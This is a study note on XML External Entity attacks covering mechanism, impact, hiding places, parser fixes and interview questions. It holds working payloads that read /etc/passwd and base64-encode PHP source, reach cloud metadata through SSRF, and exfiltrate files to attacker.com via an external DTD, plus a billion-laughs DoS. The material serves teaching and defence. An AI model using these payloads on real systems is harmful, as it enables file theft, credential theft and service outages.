---
tags: [vuln, web, a05, xxe, injection]
owasp: A05:2025
difficulty: medium
status: learning
---

# XXE (XML External Entity) Attacks

> XML parsers can be instructed, *by the document being parsed*, to fetch external resources through **entities**. If a parser processes attacker-controlled XML with external-entity resolution enabled (the historical default), you get arbitrary **file read**, [[SSRF-Server-Side-Request-Forgery]], out-of-band exfiltration, denial of service, and occasionally **RCE**. Same injection root cause as [[Injection-SQLi]] — untrusted input reaching a powerful interpreter — with XML as the interpreter.

---

## 1. The mechanism — entities

XML lets a document define **entities** (like variables). A **general entity** `&name;` expands to some value. An **external** entity pulls that value from a URI:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">     <!-- external entity -->
]>
<data>&xxe;</data>                               <!-- parser inlines /etc/passwd -->
```

If the app echoes the parsed `<data>` back, you receive the file contents. Root cause: **DTD processing + external-entity resolution enabled**, and the app parses **untrusted** XML.

---

## 2. The full impact ladder

| Goal | Payload sketch | Notes |
|---|---|---|
| **Local file read** | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Source code, `/etc/passwd`, config, keys |
| **SSRF** | `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/...">` | Cloud metadata → creds. See [[SSRF-Server-Side-Request-Forgery]] |
| **Blind / OOB exfil** | External DTD that sends file contents to your server | When no direct output — see §4 |
| **DoS (billion laughs)** | Nested entity expansion | Exponential memory blow-up (§5) |
| **RCE (situational)** | PHP `expect://id`, or via a vulnerable processor | Rare, needs specific modules |
| **Parameter smuggling** | `php://filter` to base64-encode files that contain XML-breaking chars | PHP-specific read trick |

**PHP file-read trick** (source often contains `<`/`&` that break XML — wrap it):
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```

---

## 3. Where XXE hides (rarely a field labelled "XML")
- SOAP APIs, SAML assertions (auth bypass potential), WS-Security
- **File uploads that are secretly zipped XML**: `.docx`, `.xlsx`, `.pptx`, `.svg`, `.pdf` (some)
- RSS/Atom feeds, sitemap uploads, SVG image processing (ImageMagick, thumbnailers)
- **The pro move:** a **JSON API that also accepts `Content-Type: application/xml`.** Content-negotiating frameworks (Spring, many REST stacks) will parse an XML body on an endpoint you thought was JSON-only. Always resend a JSON request as XML:
  ```http
  POST /api/user  HTTP/1.1
  Content-Type: application/xml

  <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
  <user><name>&x;</name></user>
  ```
  See [[HTTP-Deep-Dive]] Content-Type section.

---

## 4. Blind XXE — out-of-band exfiltration
When the response doesn't reflect the entity, exfiltrate via a **parameter entity** in an external DTD you host:

```xml
<!-- attacker sends -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd">
  %ext;
]>
<data>test</data>
```
```xml
<!-- attacker.com/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```
The parser reads the file, then makes an HTTP request to your server with the contents in the query string. Also confirm blind XXE simply via an **OOB DNS/HTTP callback** (Burp Collaborator / interactsh) — a DNS hit proves the parser is resolving external entities even if you can't read files yet.

---

## 5. Billion Laughs (entity-expansion DoS)
```xml
<!DOCTYPE lol [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- ...lol9 → billions of expansions → memory exhaustion -->
]>
<lolz>&lol9;</lolz>
```
Even parsers with external entities *disabled* may be vulnerable to this if internal entity expansion is unbounded — so DoS hardening (entity limits) matters separately.

---

## 6. The fix — disable DTDs / external entities

The correct fix is **parser configuration**, per language/library:

```python
# ✅ Python — use defusedxml, which disables the dangerous features
from defusedxml.ElementTree import parse
# (never use vanilla xml.etree / lxml on untrusted input without hardening)
```
```java
// ✅ Java — disable DOCTYPE entirely (strongest)
DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
f.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
f.setFeature("http://xml.org/sax/features/external-general-entities", false);
f.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
f.setXIncludeAware(false);
f.setExpandEntityReferences(false);
```
```php
// ✅ PHP ≥8 disables external entity loading by default; on older:
libxml_set_external_entity_loader(null);
```
```dotnet
// ✅ .NET — XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit }
```

**Principles:**
- **Disable DOCTYPE processing entirely** where you can (kills XXE *and* billion-laughs).
- If DTDs are needed, disable **external general + parameter entities** and `XInclude`.
- Prefer **JSON** if you don't actually need XML.
- Input validation/WAF is **not** a fix — encodings and OOB variants bypass it.

---

## 7. Real-world cases
- **Facebook, Google, Uber, Shopify** — many disclosed XXEs via file upload (DOCX/SVG), SAML, and XML APIs; high bounties (some five-figure).
- **SAML XXE / signature-wrapping** — XML-based SSO has repeatedly been broken via entity and signature-wrapping attacks → auth bypass.
- **Apache/Java library CVEs** — default-unsafe XML parsers across the Java ecosystem drove the "disable DTDs" standard.
- **Uber XXE (2016 writeup)** — classic file-read via an XML endpoint, widely studied.

---

## 8. Practice + interview questions

### Practice
- **PortSwigger Academy → XXE** — all labs: file read, SSRF via XXE, blind OOB exfil with an external DTD, XXE via SVG/file upload, and via `Content-Type` switch.
- Build a small endpoint using a default XML parser, read `/etc/passwd`, then chain to a mock metadata endpoint, then harden the parser and confirm both die.

### Interview questions
- *What is XXE and what does it enable?* (External-entity resolution → file read, SSRF, OOB exfil, DoS; sometimes RCE.)
- *You have a JSON API — where would you look for XXE?* (Resend as `application/xml`; SAML; file uploads that are secretly XML — SVG/DOCX/XLSX.)
- *The response doesn't reflect anything — is XXE dead?* (No — blind XXE via an external DTD exfiltrates out-of-band; confirm with a DNS/HTTP callback.)
- *How do you fix XXE properly?* (Disable DTDs/external entities in the parser — defusedxml, `disallow-doctype-decl`, etc. Not WAF/validation.)
- *How does XXE become SSRF/cloud takeover?* (External entity pointing at `169.254.169.254` → metadata creds → [[SSRF-Server-Side-Request-Forgery]] chain.)

---

**Related:** [[SSRF-Server-Side-Request-Forgery]] · [[Injection-SQLi]] · [[Path-Traversal-and-File-Upload]] · [[HTTP-Deep-Dive]]
